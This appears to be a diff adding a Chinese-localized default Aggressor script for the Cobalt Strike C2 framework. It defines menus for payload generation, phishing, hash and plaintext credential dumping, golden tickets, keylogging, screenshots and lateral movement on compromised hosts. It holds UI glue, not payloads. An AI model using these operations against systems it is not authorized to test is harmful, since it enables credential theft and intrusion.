@@ -1,0 +1,1241 @@
+#
+# Default script for Cobalt Strike Aggressor
+#
+debug(5);
+
+# define our top-level menubar
+menubar("&Cobalt Strike", "aggressor");
+menubar("视图(&V)",      "view");
+menubar("攻击(&A)",   "attacks");
+menubar("报告(&R)", "reporting");
+menubar("帮助(&H)",      "help");
+
+#
+popup aggressor {
+	item("新建连接(&N)", { openConnectDialog(); });
+	separator();
+	item("偏好设置(&P)", { openPreferencesDialog(); });
+	menu "可视化(&V)" {
+		item("拓补透视图(&P)", {
+			showVisualization("Pivot Graph");
+		});
+
+		item("会话列表(&S)", {
+			showVisualization("Session Browser");
+		});
+
+		item("目标列表(&T)", {
+			showVisualization("Target Browser");
+		});
+	}
+	separator();
+	item("VPN网卡(&I)", { openInterfaceManager(); });
+	item("监听器(&L)", { openListenerManager(); });
+	item("脚本管理器(&S)", { openScriptManager(); });
+	separator();
+	item("断开连接(&C)", { closeClient(); });
+}
+
+popup view {
+	#item("&Beacons", { openBeaconBrowser(); });
+	item("应用程序(&A)", { openApplicationManager(); });
+	item("密码凭证(&C)", { openCredentialManager(); });
+	item("下载列表(&D)", { openDownloadBrowser(); });
+	item("事件日志(&E)", { openEventLog(); });
+	item("键盘记录(&K)", { openKeystrokeBrowser(); });
+	item("代理转发(&P)", { openSOCKSBrowser(); });
+	item("屏幕截图(&S)", { openScreenshotBrowser(); });
+	item("脚本控制台(&C)", { openScriptConsole(); });
+	item("目标列表(&T)", { openTargetBrowser(); });
+	item("Web日志(&W)", { openWebLog(); });
+
+	insert_menu("view_other");
+}
+
+popup attacks {
+	menu "生成后门(&P)" {
+		item("HTA文档(&H)", { openHTMLApplicationDialog(); });
+		item("Office宏(&O)", { openOfficeMacroDialog(); });
+		item("Payload生成器(&P)", { openPayloadGeneratorDialog(); });
+		#item("&USB/CD AutoPlay", { openAutoRunDialog(); });
+		#item("Windows &Dropper", { openWindowsDropperDialog(); });
+		item("Windows可执行程序(&E)", { openWindowsExecutableDialog(); });
+		item("Windows可执行程序(&Stageless)", { openWindowsExecutableStageDialog(); });
+	}
+
+	menu "Web钓鱼(&W)" {
+		item("站点管理(&M)", { openSiteManager(); });
+		separator();
+		item("网站克隆(&C)", { openCloneSiteDialog(); });
+		item("文件托管(&H)", { openHostFileDialog(); });
+		item("&Web投递(Stageless)", { openScriptedWebDialog(); });
+		item("签名Applet攻击(&S)", { openJavaSignedAppletDialog(); });
+		item("智能Applet攻击(&T)", { openJavaSmartAppletDialog(); });
+		item("信息收集(&P)", { openSystemProfilerDialog(); });
+	}
+
+	insert_menu("attacks_other");
+
+	item("邮件钓鱼(&S)", { openSpearPhishDialog(); });
+}
+
+popup reporting {
+	# pull a list of registered reports and make menus for each
+	local('$index $report');
+	foreach $index => $report (reports()) {
+		item("& $+ $index $+ . $report", lambda({
+			openReportDialog($report);
+		}, \$report));
+	}
+
+	separator();
+
+	item "清空数据(&R)" {
+		prompt_confirm("这个操作将清空Cobalt Strike数据。你将丢失所有迄今为止收集到的\n信息，且数据清空后无法恢复。点击'是'清空所有数据。", "清空数据", {
+			resetData();
+		});
+	}
+
+	item "导出数据(&X)" {
+		openExportDataDialog();
+	}
+}
+
+popup help {
+	item("官方主页(&H)", { url_open("https://www.cobaltstrike.com/"); });
+	item("技术支持(&S)",  { url_open("https://www.cobaltstrike.com/support"); });
+	item("武器库(&A)",  { url_open("https://www.cobaltstrike.com/scripts"); });
+
+	insert_menu("help_other");
+
+	separator();
+	item("系统信息(&S)", { openSystemInformationDialog(); });
+	separator();
+	item("关于(&A)", { openAboutDialog(); });
+}
+
+popup beacon {
+	item "会话交互(&I)" {
+		local('$bid');
+		foreach $bid ($1) {
+			openOrActivate($bid);
+		}
+	}
+
+	separator();
+
+	insert_menu("beacon_top", $1);
+
+	menu "凭证提权(&A)" {
+		item "抓取Hash(&D)" {
+			local('$bid');
+			foreach $bid ($1) {
+				openOrActivate($bid);
+				binput($bid, "hashdump");
+				if (-isadmin $bid) {
+					bhashdump($bid);
+				}
+				else {
+					berror($bid, "this command requires administrator privileges");
+				}
+			}
+		}
+		item "权限提升(&E)" { openElevateDialog($1); }
+		item "黄金票据(&T)" { 			
+			local('$bid');
+			foreach $bid ($1) {
+				openGoldenTicketDialog($bid);
+			}
+		}
+		item "创建令牌(&o)" {
+			local('$bid');
+			foreach $bid ($1) {
+				openMakeTokenDialog($bid);
+			}
+		}
+
+		item "PowerShell一句话(&O)" {
+			openOneLinerDialog($1);
+		}
+
+		item "抓取明文密码(&M)" { 
+			openOrActivate($1);
+			binput($1, "logonpasswords");
+			blogonpasswords($1); 
+		}
+		item "以其他用户上线(&S)"  { 
+			local('$bid');
+			foreach $bid ($1) {
+				openSpawnAsDialog($bid);
+			}
+		}
+	}
+
+	menu "浏览探测(&E)" {
+		item "浏览器代理(&B)" {
+			local('$bid');
+			foreach $bid ($1) {
+				openBrowserPivotSetup($bid);
+			}
+		}
+		item "VNC桌面交互(&D)" { 
+			binput($1, "desktop");
+			bdesktop($1); 
+		}
+		item "文件浏览(&F)" { 
+			local('$bid');
+			foreach $bid ($1) {
+				openFileBrowser($bid);
+			}
+		}
+		item "网络探测(&N)" { 
+			openOrActivate($1);
+			binput($1, "net view");
+			bnetview($1); 
+		}
+		item "端口扫描(&S)" { 
+			local('$bid');
+			foreach $bid ($1) {
+				openPortScannerLocal($bid); 
+			}
+		}
+		item "进程列表(&P)" { openProcessBrowser($1); }
+		item "屏幕截图(&c)" {
+			binput($1, "screenshot");
+			bscreenshot($1); 
+		}
+	}
+
+	menu "代理转发(&P)" {
+		item "Socks代理(&S)" {
+			local('$bid');
+			foreach $bid ($1) {
+				openSOCKSSetup($bid);
+			}
+		}
+
+		item "转发上线(&L)" { 
+			local('$bid');
+			foreach $bid ($1) {
+				openPivotListenerSetup($bid);
+			}
+		}
+
+		separator();
+
+		item "部署VPN(&D)" {
+			local('$bid');
+			foreach $bid ($1) {
+				openCovertVPNSetup($bid);
+			}
+		}
+	}
+
+	item "新建会话(&S)" { 
+		openPayloadHelper(lambda({
+			binput($bids, "spawn $1");
+			bspawn($bids, $1);
+		}, $bids => $1));
+	}
+
+	insert_menu("beacon_bottom", $1);
+
+	separator();
+
+	menu "会话操作(&e)" {
+		item "备注...(&N)" {
+			# resolve the note attached to the first highlighted beacon
+			local('$note');
+			$note = beacon_info($1[0], "note");
+
+			# prompt the user for a new note.
+			prompt_text("设置Beacon备注:", $note, lambda({
+				binput($bids, "note $1");
+				beacon_note($bids, $1);
+			}, $bids => $1));
+		}
+
+		menu "颜色标记(&C)" {
+			insert_component(colorPanel("beacons", $1));
+		}
+
+
+		item "删除会话(&R)" {
+			beacon_remove($1);
+		}
+
+		item "回连间隔(&S)" { 
+			prompt_text("请设置回连间隔时间，格式为：秒数 [抖动百分比]", "60", lambda({
+				local('$time $jitter');
+				if ($1 ismatch "(\\d+) (\\d+)") {
+					($time, $jitter) = matched();
+					binput($bids, "sleep $1");
+					bsleep($bids, $time, $jitter);
+				}
+				else if ($1 ismatch "(\\d+)") {
+					($time) = matched();
+					binput($bids, "sleep $1");
+					bsleep($bids, $time);
+				}
+				else {
+					show_message("参数 $+ $1 $+ 无法解析");
+				}
+			}, $bids => $1));
+		}
+
+		item "退出(&E)" { 
+			binput($1, "exit");
+			bexit($1);
+		}
+	}
+}
+
+popup ssh {
+	item "会话交互(&I)" {
+		local('$bid');
+		foreach $bid ($1) {
+			openOrActivate($bid);
+		}
+	}
+
+	menu "代理转发(&P)" {
+		item "SOCKS代理(&S)" {
+			local('$bid');
+			foreach $bid ($1) {
+				openSOCKSSetup($bid);
+			}
+		}
+
+		item "转发上线(&L)" { 
+			local('$bid');
+			foreach $bid ($1) {
+				openPivotListenerSetup($bid);
+			}
+		}
+	}
+
+	menu "会话操作(&e)" {
+		item "备注...(&N)" {
+			# resolve the note attached to the first highlighted beacon
+			local('$note');
+			$note = beacon_info($1[0], "note");
+
+			# prompt the user for a new note.
+			prompt_text("设置会话备注:", $note, lambda({
+				binput($bids, "note $1");
+				beacon_note($bids, $1);
+			}, $bids => $1));
+		}
+
+		menu "颜色标记(&C)" {
+			insert_component(colorPanel("beacons", $1));
+		}
+
+		item "删除会话(&R)" {
+			beacon_remove($1);
+		}
+
+		item "退出(&E)" { 
+			binput($1, "exit");
+			bexit($1);
+		}
+	}
+}
+
+popup pgraph {
+	menu "布局(&L)" {
+		item "环形(&C)"    { graph_layout($1, "circle"); }
+		item "堆叠(&S)"     { graph_layout($1, "stack"); }
+		menu "树形(&T)" {
+			item "下(&B)" { graph_layout($1, "tree-bottom"); }
+			item "左(&L)"   { graph_layout($1, "tree-left"); }
+			item "右(&R)"  { graph_layout($1, "tree-right"); }
+			item "上(&T)"    { graph_layout($1, "tree-top"); }
+		}
+		separator();
+		item "默认(&N)" { graph_layout($1, "none"); }
+	}
+
+	menu "已断开会话(&U)" {
+		item "隐藏(&H)" { graph_show_disconnected($1, false); }
+		item "显示(&S)" { graph_show_disconnected($1, true); }
+	}
+}
+
+popup targets {
+	menu "横向移动(&J)" {
+		# add our exploits
+		local('$exploit @x');
+		@x = concat(@("ssh", "ssh-key"), beacon_remote_exploits());
+		foreach $exploit (sorta(@x)) {
+			item($exploit, lambda({ 
+				openJumpDialog($exploit, $1);  
+			}, \$exploit));
+		}
+	}
+
+	separator();
+
+	# find all sessions for this host and create menus for them
+	local('$beacon $user $pid');
+	foreach $beacon (beacons()) {
+		if ($beacon['internal'] in $1) {
+			($user, $pid) = values($beacon, @('user', 'pid'));
+			if (!-isactive $beacon['id']) {
+				# skip sessions that are dead.
+			}
+			else if (-isssh $beacon['id']) {
+				menu("$user", lambda({
+					insert_menu("ssh", @($bid));
+				}, $bid => $beacon['id']));
+			}
+			else {
+				menu("$user $+ @ $+ $pid", lambda({
+					insert_menu("beacon", @($bid));
+				}, $bid => $beacon['id']));
+			}
+		}
+	}
+
+	item "扫描(&S)" { openPortScanner($1); }
+	item "服务(&v)" { openServiceBrowser($1); }
+
+	insert_menu("targets_other", $1);
+
+	separator();
+
+	menu "主机(&H)" {
+		menu "操作系统(&O)" {
+			item "&Android"   { host_update($1, $null, "Android", 1.0, $null); }
+			item "Apple &iOS" { host_update($1, $null, "Apple iOS", 1.0, $null); }
+			item "&Cisco IOS" { host_update($1, $null, "Cisco IOS", 1.0, $null); }
+			item "Fire&wall"  { host_update($1, $null, "Firewall", 1.0, $null); }
+			item "&FreeBSD"   { host_update($1, $null, "FreeBSD", 1.0, $null); }
+			item "&Linux"     { host_update($1, $null, "Linux", 1.0, $null); }
+			item "&MacOS X"   { host_update($1, $null, "MacOS X", 1.0, $null); }
+			item "&NetBSD"    { host_update($1, $null, "NetBSD", 1.0, $null); }
+			item "&OpenBSD"   { host_update($1, $null, "OpenBSD", 1.0, $null); }
+			item "&Printer"   { host_update($1, $null, "Printer", 1.0, $null); }
+			item "&Solaris"   { host_update($1, $null, "Solaris", 1.0, $null); }
+			item "&Unknown"   { host_update($1, $null, "Unknown", 1.0, $null); }
+			item "&VMware"    { host_update($1, $null, "VMware", 1.0, $null); }
+			menu "&Windows" {
+				item "1. 95/98/2000" { host_update($1, $null, "Windows", 5.0, $null); }
+				item "2. XP/2003"    { host_update($1, $null, "Windows", 5.1, $null); }
+				item "3. Vista/7"    { host_update($1, $null, "Windows", 6.0, $null); }
+				item "4. 8/10/RT"    { host_update($1, $null, "Windows", 6.2, $null); }
+			}
+		}
+
+		item "名字...(&N)" { 
+			prompt_text("设置名字:", "", lambda({
+				host_update($bids, $1, $null, 0.0, $null);
+			}, $bids => $1));
+		}
+
+		item "备注...(&o)" { 
+			prompt_text("设置备注:", "", lambda({
+				host_update($bids, $null, $null, 0.0, $1);
+			}, $bids => $1));
+		}
+
+		menu "颜色标记(&C)" {
+			insert_component(colorPanel("targets", $1));
+		}
+
+		separator();
+		item "删除主机(&R)" { host_delete($1); }
+	}
+}
+
+#
+# setup our toolbar too!
+#
+
+toolbar(image_internal("resources/cc/black/png/sq_plus_icon&16.png"),  "连接到Teamserver", { openConnectDialog(); });
+toolbar(image_internal("resources/cc/black/png/sq_minus_icon&16.png"), "从Teamserver断开", { closeClient(); });
+toolbar_separator();
+toolbar(image_internal("resources/cc/black/png/headphones_icon&16.png"), "配置监听器", { openListenerManager(); });
+toolbar_separator();
+toolbar(image_internal("resources/cc/black/png/share_icon&16.png"), "以图形式展示会话", { showVisualization("Pivot Graph"); });
+toolbar(image_internal("resources/cc/black/png/align_just_icon&16.png"), "以列表形式展示会话", { showVisualization("Session Browser"); });
+toolbar(image_internal("resources/cc/black/png/target_icon&16.png"), "以列表形式展示目标", { showVisualization("Target Browser"); });
+toolbar_separator();
+toolbar(image_internal("resources/cc/black/png/contact_card_icon&16.png"), "密码凭证", { openCredentialManager(); });
+toolbar(image_internal("resources/cc/black/png/download_icon&16.png"), "已下载文件列表", { openDownloadBrowser(); });
+toolbar(image_internal("resources/cc/black/png/key_icon&16.png"), "键盘记录", { openKeystrokeBrowser(); });
+toolbar(image_internal("resources/cc/black/png/picture_icon&16.png"), "屏幕截图", { openScreenshotBrowser(); });
+toolbar_separator();
+toolbar(image_internal("resources/cc/black/png/cog_icon&16.png"),  "生成Windows可执行文件(Stageless)", { openWindowsExecutableStageDialog(); });
+toolbar(image_internal("resources/cc/black/png/coffe_cup_icon&16.png"), "Java签名Applet攻击", { openJavaSignedAppletDialog(); });
+toolbar(image_internal("resources/cc/black/png/doc_lines_icon&16.png"), "Office宏", { openOfficeMacroDialog(); });
+toolbar(image_internal("resources/cc/black/png/app_window_shell&16.png"),  "Web投递(Stageless)", { openScriptedWebDialog(); });
+toolbar_separator();
+toolbar(image_internal("resources/cc/black/png/link_icon&16.png"), "文件托管", { openHostFileDialog(); });
+toolbar(image_internal("resources/cc/black/png/cloud_icon&16.png"), "管理Web站点", { openSiteManager(); });
+toolbar_separator();
+toolbar(image_internal("resources/cc/black/png/book_side_icon&16.png"), "技术支持", { url_open("https://www.cobaltstrike.com/support"); });
+toolbar(image_internal("resources/cc/black/png/box_icon&16.png"), "关于", { openAboutDialog(); });
+
+#
+# redefine what some things look like.
+#
+
+# chat messages in event log
+
+# from, text, when
+set EVENT_PUBLIC {
+	if (mynick() eq $1) {
+		return "\cF" . dstamp($3) . " \c6<\c0 $+ $1 $+ \c6>\cF $2";
+	}
+	else if (mynick() isin $2) {
+		return "\cF" . dstamp($3) . " \c6<\c8 $+ $1 $+ \c6>\cF $2";
+	}
+	else {
+		return "\cF" . dstamp($3) . " \c6<\cF $+ $1 $+ \c6>\cF $2";
+	}
+}
+
+# from, to, text, when
+set EVENT_PRIVATE {
+	if (mynick() eq $1 && mynick() eq $2) {
+		return "\cF" . dstamp($4) . " \cE-> [\cB $+ $1 $+ \cE]\cF $3 $+ \n" .
+		       "\cF" . dstamp($4) . " \cE<- [\c9 $+ $1 $+ \cE]\cF $3";
+	}
+	else if (mynick() eq $1) {
+		return "\cF" . dstamp($4) . " \cE-> [\cB $+ $2 $+ \cE]\cF $3";
+	}
+	else if (mynick() eq $2) {
+		return "\cF" . dstamp($4) . " \cE<- [\c9 $+ $1 $+ \cE]\cF $3";
+	}
+}
+
+# from, text, when
+set EVENT_ACTION {
+	# I sent the action
+	if (mynick() eq $1) {
+		return "\cF" . dstamp($3) . " \c6*\c0 $1 \cF $+ $2";
+	}
+	# someone else sent the action
+	else {
+		return "\cF" . dstamp($3) . " \c6*\cF $1 $2";
+	}
+}
+
+# from, when
+set EVENT_JOIN {
+	return "\cF" . dstamp($2) . " \c3***\c9 $1 \c3has joined.";
+}
+
+# from, when
+set EVENT_QUIT {
+	return "\cF" . dstamp($2) . " \cA***\cB $1 \cAhas left.";
+}
+
+# text, when
+set EVENT_NOTIFY {
+	return "\cF" . dstamp($2) . " \c7*** $1";
+}
+
+# from, text, when
+set EVENT_NEWSITE {
+	return "\cF" . dstamp($3) . " \c7*** $1 $2";
+}
+
+# to, when
+set EVENT_NOUSER {
+	return "\cF" . dstamp($2) . " \c5***\c4 $1 \c5is not here.";
+}
+
+set EVENT_BEACON_INITIAL {
+	return "\cF" . dstamp($2) . " \c7*** initial beacon from\c8 $1";
+}
+
+set EVENT_SSH_INITIAL {
+	return "\cF" . dstamp($2) . " \c7*** new ssh session\c8 $1";
+}
+
+# @users
+set EVENT_USERS {
+	local('$out $user');
+	$out  = "\n\cF Users\n";
+	$out .= "\cE -----\n";
+	foreach $user ($1) {
+		$out .= "\cF $user $+ \n";
+	}
+
+	return $out;
+}
+
+set EVENT_SBAR_LEFT {
+	return "[" . tstamp(ticks()) . "] " . mynick(); 
+}
+
+set EVENT_SBAR_RIGHT {
+	return "[lag: $1 $+ ]";
+}
+
+# weblog
+
+# method, uri, addr, ua, response, size, handler, when
+set WEB_HIT {
+	local('$out $now $method $uri $addr $ua $response $size $handler $when $params $port');
+	($method, $uri, $addr, $ua, $response, $size, $handler, $params, $when, $port) = @_;
+
+	$now  = dstamp($when);
+	$out  = "$now visit (port $port $+ ) from\cE:\o $addr $+ \n";
+	$out .= "\tRequest\cE:\o $method $uri $+ \n";
+
+	if ($handler ne "") {
+		$out .= "\t $+ $handler $+ \n";
+	}
+	else {
+		$out .= "\tResponse\cE:\c4 $response $+ \n";
+	}
+
+	$out .= "\t $+ $ua $+ \n";
+
+	if (size($params) > 0) {
+		local('$key $value');
+
+		$out .= "\t= Form Data=\n";
+
+		foreach $key => $value ($params) {
+			$out .= "\t $+ $[10]key = $value $+ \n";
+		}
+	}
+
+	return "$out $+ \n";
+}
+
+set PROFILER_HIT {
+	local('$out $app $ver');
+	
+	$out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $5 $+ ] Applications";
+	foreach $app => $ver ($4) {
+		$out .= "\n\t $+ $[25]app $ver";
+	}
+
+	return "$out $+ \n\n";
+}
+
+set KEYLOGGER_HIT {
+	local('$date $data $r $d $f');
+	$date = formatDate('yyyy-MM-dd HH:mm:ss Z');
+	$data = split(',', $3);
+
+	foreach $d ($data) {
+		if ($d eq '8') {
+			$r .= '<DEL>';
+		}
+		else if ($d eq '9') {
+			$r .= '<TAB>';
+		}
+		else if ($d eq '13' || $d eq '10') {
+			$r .= '<ENTER>';
+		}
+		else if ($d ne "") {
+			$f = chr(formatNumber($d, 16, 10));
+			$r .= $f;
+		}
+	}
+
+	return "\c9[+]\o $2 [ $+ $4 $+ ] Keys $1 $+ : $r $+ \n";
+}
+
+# beacon console
+
+# beaconid, %meta
+set BEACON_SBAR_LEFT {
+	local('$computer $user $pid $barch');
+	($computer, $user, $pid, $barch) = values($2, @('computer', 'user', 'pid', 'barch'));
+	if ("x86" eq $barch) {
+		return "[ $+ $computer $+ ] $user $+ / $+ $pid";
+	}
+	else if ("x64" eq $barch) {
+		return "[ $+ $computer $+ ] $user $+ / $+ $pid \cE(x64)\o";
+	}
+	else {
+		return "";
+	}
+}
+
+# beaconid, %meta
+set BEACON_SBAR_RIGHT {
+	if ($2['note'] ne "") {
+		return "\c2" . $2['note'] . "  \olast: " . $2['lastf'] . " ";
+	}
+	else {
+		return "last: " . $2['lastf'] . " ";
+	}
+}
+
+# beaconid, message
+set BEACON_CHECKIN {
+	return "\c9[+]\o " . strrep($2, ':', "\cE:\o");
+}
+
+# beaconid, error
+set BEACON_ERROR {
+	return "\c4[-]\o " . strrep($2, ':', "\cE:\o");
+}
+
+# beaconid, whatever: meh
+set BEACON_TASKED {
+	return "\cC[*]\o " . strrep($2, ':', "\cE:\o");
+}
+
+# beaconid, whatever: meh too
+set BEACON_OUTPUT {
+	return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
+}
+
+# beaconid, whatever: meh too
+set BEACON_OUTPUT_ALT {
+	return "\cC[*]\o " . strrep($2, ":\n", "\cE:\n\o");
+}
+
+# output for the ps command too
+set BEACON_OUTPUT_PS {
+	local('$out $temp $name $ppid $pid $arch $user $session @ps');
+	$out .= "\cC[*]\o Process List\n\n";
+	$out .= " PID   PPID  Name                         Arch  Session     User\n";
+	$out .= "\cE ---   ----  ----                         ----  -------     -----\n";
+
+	foreach $temp (split("\n", ["$2" trim])) {
+		($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
+		push(@ps, %(pid => $pid, entry => " $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user"));
+	}
+
+	# sort the processes please
+	sort({ return $1['pid'] <=> $2['pid']; }, @ps);
+
+	# append to our outstring
+	foreach $temp (@ps) {
+		$out .= $temp['entry'] . "\n";
+	}
+
+	return $out;
+}
+
+# output for the ls command
+set BEACON_OUTPUT_LS {
+	local('$out @results $cwd $entry $type $size $modified $name');
+	@results = split("\n", ["$2" trim]);
+
+	$cwd = left(shift(@results), -1);	# first entry is the current folder
+
+	# parse/process results
+	foreach $entry (@results) {
+		($type, $size, $modified, $name) = split("\t", $entry);
+		if ($type eq "F") {
+			$entry = %(type => "fil", size => format_size($size), modified => $modified, name => $name);
+		}
+		else if ($type eq "D" && $name ne "." && $name ne "..") {
+			$entry = %(type => "dir", size => "", modified => $modified, name => $name);
+		}
+		else {
+			remove();
+		}
+	}
+
+	# sort in alpha order with dir listings on top.
+	sort({ return ($1['type'] . lc($1['name'])) cmp ($2['type'] . lc($2['name'])); }, @results);
+
+	$out .= "\cC[*]\o Listing: $cwd $+ \n\n";
+	$out .= " Size     Type    Last Modified         Name\n";   
+	$out .= "\cE ----     ----    -------------         ----\n";
+
+	foreach $entry (@results) {
+		($type, $size, $modified, $name) = values($entry, @('type', 'size', 'modified', 'name'));
+		$out .= " $[8]size $[7]type $[21]modified $name $+ \n";
+	}
+
+	return $out;
+}
+
+# output for the jobs command too
+set BEACON_OUTPUT_JOBS {
+	local('$out $temp $jid $pid $desc');
+	$out .= "\cC[*]\o Jobs\n\n";
+	$out .= " JID  PID   Description\n";
+	$out .= "\cE ---  ---   -----------\n";
+
+	foreach $temp (split("\n", ["$2" trim])) {
+		($jid, $pid, $desc) = split("\t", $temp);
+		$out .= " $[4]jid $[5]pid $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_DOWNLOADS {
+	local('$out $entry $name $path $size $rcvd $pct');
+	$out .= "\cC[*]\o Downloads\n\n";
+	$out .= " Name               Size    Received        Path\n";
+	$out .= "\cE ----               ----    --------        ----\n";
+	
+	foreach $entry ($2) {
+		($name, $path, $size, $rcvd) = values($entry, @("name", "path", "size", "rcvd"));
+		$pct  = round((double($rcvd) / $size) * 100.0, 1) . '%';
+		$size = format_size($size);
+		$rcvd = format_size($rcvd);
+		$rcvd = "$rcvd ( $+ $pct $+ )";
+
+		$out .= " $[18]name $[7]size $[15]rcvd $path $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_EXPLOITS {
+	local('$out $exp $desc');
+
+	$out  = "\n";
+	$out .= "Beacon Local Exploits\n";
+	$out .= "\cE=====================\n\n";
+	$out .= "    Exploit                         Description\n";
+	$out .= "\cE    -------                         -----------\n";
+
+	foreach $exp (sorta(beacon_exploits())) {
+		$desc = beacon_exploit_describe($exp);
+		$out .= "    $[26]exp $+ $[6]null $+ $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_ELEVATORS {
+	local('$out $exp $desc');
+
+	$out  = "\n";
+	$out .= "Beacon Command Elevators\n";
+	$out .= "\cE========================\n\n";
+	$out .= "    Exploit                         Description\n";
+	$out .= "\cE    -------                         -----------\n";
+
+	foreach $exp (sorta(beacon_elevators())) {
+		$desc = beacon_elevator_describe($exp);
+		$out .= "    $[26]exp $+ $[6]null $+ $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_REMOTE_EXEC_METHODS {
+	local('$out $exp $desc');
+
+	$out  = "\n";
+	$out .= "Beacon Remote Execute Methods\n";
+	$out .= "\cE=============================\n\n";
+	$out .= "    Methods                         Description\n";
+	$out .= "\cE    -------                         -----------\n";
+
+	foreach $exp (sorta(beacon_remote_exec_methods())) {
+		$desc = beacon_remote_exec_method_describe($exp);
+		$out .= "    $[26]exp $+ $[6]null $+ $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_REMOTE_EXPLOITS {
+	local('$out $exp $desc $arch');
+
+	$out  = "\n";
+	$out .= "Beacon Remote Exploits\n";
+	$out .= "\cE======================\n\n";
+	$out .= "    Exploit                   Arch  Description\n";
+	$out .= "\cE    -------                   ----  -----------\n";
+
+	foreach $exp (sorta(beacon_remote_exploits())) {
+		$arch = beacon_remote_exploit_arch($exp);
+		$desc = beacon_remote_exploit_describe($exp);
+		$out .= "    $[26]exp $+ $[6]arch $+ $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_HELP {
+	local('$out $cmd $desc');
+	$out  = "\n";
+	$out .= "Beacon Commands\n";
+	$out .= "\cE===============\n\n";
+	$out .= "    Command                   Description\n";
+	$out .= "\cE    -------                   -----------\n";
+
+	foreach $cmd (sorta(beacon_commands())) {
+		$desc = beacon_command_describe($cmd);
+		$out .= "    $[26]cmd $+ $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set BEACON_OUTPUT_HELP_COMMAND {
+	return strrep(beacon_command_detail($1), "Use:", "Use\cE:\o");
+}
+
+set BEACON_MODE {
+	return "\c9[+]\o $2";
+}
+
+# bid, from, text, when
+set BEACON_INPUT {
+	if ("ssh" eq beacon_info($1, "session")) {
+		if ($2 eq mynick()) {
+			return "\Ussh\o> $3";
+		}
+		else {
+			return "$2 \Ussh\o> $3";
+		}
+	}
+	else {
+		if ($2 eq mynick()) {
+			return "\Ubeacon\o> $3";
+		}
+		else {
+			return "$2 \Ubeacon\o> $3";
+		}
+		return "$2 \Ubeacon\o> $3";
+	}
+}
+
+# Return a timestamp prefix for the beacon console (Enabled in Preferences)
+# bid, from, text, when, tactic
+set BEACON_CONSOLE_TIMESTAMP {
+	return dstamp($4) . " ";
+}
+
+# preamble, indicating that we're starting a phishing attack
+set SENDMAIL_START {
+	local('$res $victims $ntarget $attachment $bounceto $server $subject $templatef $url');
+	($null, $ntarget, $attachment, $bounceto, $server, $subject, $templatef, $url) = @_;
+
+	$res = "\cC[*]\o Starting mass email on " . formatDate('yyyy-MM-dd HH:mm:ss Z') . "\n";
+
+	$res .= "\nPhishing Options:\n\cE=================\n\n";
+	$res .= "   Option       Current Setting\n";
+	$res .= "\cE   ------       ---------------\n";
+	
+	if ($attachment !is $null) {
+		$res .= "   Attachment   $attachment $+ \n";
+	}
+
+	$victims = iff($ntarget == 1, "$ntarget target", "$ntarget targets");
+
+	$res .= "   Bounce To    $bounceto $+ \n";
+	$res .= "   Server       $server $+ \n";
+	$res .= "   Subject      $subject $+ \n";
+	$res .= "   Targets      $victims $+ \n";
+	$res .= "   Template     $templatef $+ \n";
+	$res .= "   URL          $url $+ \n\n";
+
+	return $res;
+}
+
+set SENDMAIL_PRE {
+	# email	
+	return "\cC[*]\o Send Email\cE:\o $2 $+ \n"; 
+}
+
+set SENDMAIL_POST {
+	# cid, email, status, message
+	if ($3 eq "SUCCESS") {
+		return "\t\c9SUCCESS\cE:\o $4 $+ \n";
+	}
+	else if ($3 eq "Failed") {
+		return "\t\c4Failed\cE:\o $4 $+ \n";
+	}
+}
+
+set SENDMAIL_DONE {
+	return "\n\cC[*]\o Email sent on " . formatDate('yyyy-MM-dd HH:mm:ss Z') . "\n";
+}
+
+on ready {
+	# register the beacon table.
+	addVisualization("Session Browser", sbrowser());
+
+	# register the target browser.
+	addVisualization("Target Browser", tbrowser());
+
+	# register the pivot graph visualization
+	addVisualization("Pivot Graph", pgraph());
+
+	# open the event log by default.
+	openEventLog();
+}
+
+sub no {
+	show_message("I'm not implemented yet.");
+}
+
+popup processbrowser {
+	item "设置为父进程PID" {
+		if (size($2) > 0) {
+			binput($1, "ppid " . $2[0]['PID']);
+			bppid($1, $2[0]['PID']);
+		}
+	}
+}
+
+popup keystrokes {
+	item "会话交互(&I)" {
+		openOrActivate($1["bid"]);
+	}
+
+	menu "颜色标记(&C)" {
+		insert_component(colorPanel("accents", $1["id"]));
+	}
+
+	item "保存(&S)" {
+		local('$document $length $text');
+		$document = $1["document"];
+		$length   = [$document getLength];
+		$text     = [$document getText: 0, $length];
+
+		prompt_file_save($1["id"] . ".txt", lambda({
+			local('$handle');
+			$handle = openf("> $+ $1");
+			writeb($handle, $text);
+			closef($handle);
+
+			show_message("键盘记录已保存");
+		}, \$text));
+	}
+
+	separator();
+
+	item "删除(&R)" {
+		prompt_confirm("这个操作将会在Cobalt Strike用户界面中删除当前键盘记录内容，\n但键盘记录器仍将继续运行，键盘记录内容将继续发送到Teamserver\n的日志中。该删除操作无法恢复，请点击'是'进行删除。", "删除键盘记录", lambda({
+			redactobject($kid);
+		}, $kid => $1["id"]));
+	}
+}
+
+popup screenshots {
+	item "会话交互(&I)" {
+		openOrActivate($1["bid"]);
+	}
+
+	menu "颜色标记(&C)" {
+		insert_component(colorPanel("accents", $1["id"]));
+	}
+
+	item "保存(&S)" {
+		prompt_file_save($1["id"] . ".jpg", lambda({
+			local('$handle');
+			$handle = openf("> $+ $1");
+			writeb($handle, $data);
+			closef($handle);
+
+			show_message("屏幕截图已保存");
+		}, $data => $1["object"]["data"]));
+	}
+
+	separator();
+
+	item "删除(&R)" {
+		redactobject($1["id"]);
+	}
+}
+
+popup downloads {
+	# do nothing if nothing is selected
+	if (size($1) == 0) {
+		return;
+	}
+
+	item "会话交互(&I)" {
+		openOrActivate($1[0]["bid"]);
+	}
+
+	menu "颜色标记(&C)" {
+		local('$ids');
+		$ids = map({ return $1["id"]; }, $1);
+		insert_component(colorPanel("accents", $ids));
+	}
+}
+
+popup filebrowser {
+	item "复制(&C)" {
+		if (size($3) > 0) {
